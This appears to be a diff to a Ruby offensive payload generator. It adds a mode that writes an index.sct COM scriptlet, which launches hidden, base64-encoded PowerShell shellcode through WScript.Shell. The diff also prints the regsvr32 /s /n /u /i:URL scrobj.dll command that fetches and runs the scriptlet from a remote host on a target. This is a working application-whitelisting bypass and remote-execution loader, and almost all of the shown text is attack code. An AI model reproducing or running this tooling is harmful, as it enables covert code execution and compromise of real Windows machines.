@@ -338,6 +338,59 @@ puts jsTEMPLATE
 
 end
 
+########################SCT_ENCODE##############################
+if $lencode == "sct"
+
+powershell_encoded = gen_PS_shellcode()
+
+sctTEMPLATE = %{<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="notEmail"
+    progid="notEmail"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    >
+    <!-- Based on work by Casey Smith @subTee -->
+    
+    <!-- regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll
+    <!-- DFIR -->
+    <!--        .sct files are downloaded and executed from a path like this -->
+    <!-- Though, the name and extension are arbitary.. -->
+    <!-- Based on current research, no registry keys are written, since call "uninstall" -->
+    
+    
+    <script language="JScript">
+        <![CDATA[
+        
+            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}");
+    
+        ]]>
+    </script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+    
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    }
+    
+]]>
+</script>
+
+</scriptlet>}
+
+File.write( 'index.sct', sctTEMPLATE) 
+puts "File: index.sct created\nUsage:\"regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll\" on the target"
+
+end
+
 ######################PHP_ENCODE###############################
 if $lencode == "php"
 
